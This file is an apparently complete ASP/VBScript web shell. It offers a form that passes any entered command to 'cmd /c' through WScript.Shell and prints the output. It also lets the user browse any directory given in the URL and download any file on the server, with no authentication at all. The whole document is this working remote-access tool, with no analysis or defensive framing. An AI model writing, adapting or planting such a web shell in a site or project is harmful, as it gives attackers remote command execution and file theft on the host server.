<%@  language="VBScript" %>
<%
	Dim fso, fldr
	Dim usercmd,thisDir
	Dim p, objItem, szFile
	Dim intSizeB, intSizeK, dtmDate
	Dim url, osFile, urlPath
	Dim parent
	Dim fname
	
	Dim objStream
	Dim oScript
	Dim error
    Dim uPath
	
	error=""
	
	Set oScript = Server.CreateObject("WSCRIPT.SHELL")
    Set fso = Server.CreateObject("Scripting.FileSystemObject")

    Sub DisplayCommand(cmd)
        thisDir = getCommandOutput("cmd /c" & cmd)
	    Response.Write(Server.HTMLEncode(thisDir))
    End Sub

    Sub DisplayError(err)
        Response.Write("<p class=error>" & err & "</p>")
    End Sub

	Function getCommandOutput(theCommand)
		Dim objShell, objCmdExec
		Set objShell = CreateObject("WScript.Shell")
		Set objCmdExec = objshell.exec(thecommand)
		getCommandOutput = objCmdExec.StdOut.ReadAll
	end Function

    Sub DownloadFile()
        Set osFile = fso.OpenTextFile (szFile, 1, False, 0)
        If (IsObject(osFile)) Then
			On Error Resume Next
			fname = fso.getfilename(szFile)
            Response.Buffer = True
            Response.Clear
            Set objStream = Server.CreateObject("ADODB.Stream")
            objStream.Open
            objStream.Type = 1
            objStream.LoadFromFile szFile
            ContentType = "application/octet-stream"
            Response.AddHeader "Content-Disposition", "attachment; filename=""" & fname & """"
            Response.Charset = "UTF-8"
            Response.ContentType = "application/x-msdownload"
            Response.BinaryWrite objStream.Read
            Response.Flush
            objStream.Close
            Set objStream = Nothing
            Response.End
		End If
    End Sub
	
	uPath = Server.URLEncode(Request.QueryString("path"))
    p = request.QueryString("path")
    usercmd = request.Form("cmd")
    szFile = request.QueryString("file")
	
	If p<>"" Then
		set fldr = fso.GetFolder(p)
	Else
		set fldr = fso.GetFolder(".")
		error="Please Set the path parameter in the URL. Example <a href='?path=C:'>C:</a> or <a href='?path=D:'>D:</a>"
	End If
	parent = fso.GetParentFolderName(p)	

	If (szFile <> "") Then
        Call DownloadFile()
	End If
%>
<html>
<head>
    <style>
        BODY {
            COLOR: #000000;
            FONT-FAMILY: arial;
            FONT-SIZE: 8pt;
        }

        TABLE {
            BACKGROUND: #000000;
            COLOR: #ffffff;
        }

        TH {
            BACKGROUND: #868686;
            COLOR: #ffffff;
        }

        TD {
            BACKGROUND: #ffffff;
            COLOR: #000000;
        }

        TT {
            FONT-FAMILY: Courier;
            FONT-SIZE: 8pt;
        }

        PRE, P {
            FONT-SIZE: 9pt;
        }

        .error {
            COLOR: red;
        }
    </style>
</head>
<body>
    <h1>Windows Commands</h1>
    <pre>
<FORM action="?path=<%=Server.URLEncode(Request.QueryString("path"))%>" method="POST">
<input type="text" name="cmd" size=45 value="<%=usercmd%>">
<input type="submit" value="Run">
</FORM>
<%
    if usercmd<>"" Then
	    Call DisplayCommand(usercmd)
    End If
%></pre>
    <h1>Directory Browse</h1>
<%
    If error<>"" Then
		Call DisplayError(error)
	End If
    Call DisplayParent()
%>
    <table width="100%" border="0" cellspacing="1" cellpadding="2">
        <tr>
            <th align="left">Name</th>
            <th align="left">Bytes</th>
            <th align="left">KB</th>
            <th align="left">Type</th>
            <th align="left">Date/Time</th>
        </tr>
<%
    set FolderList = fldr.SubFolders
    For Each objItem in FolderList  
      dtmDate = objItem.DateLastModified
	  urlPath = objItem.Path
%>
        <tr>
            <td align="left"><a href='?path=<%=Replace(Server.URLEncode(urlPath),"+","%20")%>'><%=urlPath%></a></td>
            <td align="right">N/A</td>
            <td align="right">N/A</td>
            <td align="left"><b>Directory</b></td>
            <td align="left"><%=dtmDate%></td>
        </tr>

<%
	Next

    set FileList = fldr.Files
    For Each objItem in FileList
        intSizeB = objItem.Size
		intSizeK = Int((intSizeB/1024) + .5)
		If intSizeK = 0 Then
			intSizeK = 1
		End If  
		
		dtmDate = objItem.DateLastModified
		url = Replace(Server.URLEncode(Replace(objItem.Path, "\" ,"/")),"+","%20")
%>
        <tr>
            <td align="left"><a href='?file=<%=url%>&path=<%=uPath%>'><%=objItem.Name%></a></td>
            <td align="right"><%=FormatNumber(intSizeB,0)%></td>
            <td align="right"><%=intSizeK%>K</td>
            <td align="left"><%=objItem.Type%></td>
            <td align="left"><%=dtmDate%></td>
        </tr>
<%
    Next
%>
    </table>
<%	
	Set fso = Nothing
    Set fldr = Nothing
%>
</body>
</html>
<%
	Sub DisplayParent()
        if parent<>"" Then
%>
    <p><a href='?path=<%=Server.URLEncode(parent)%>'>Parent</a></p>
<%
	    End If
    End Sub
%>
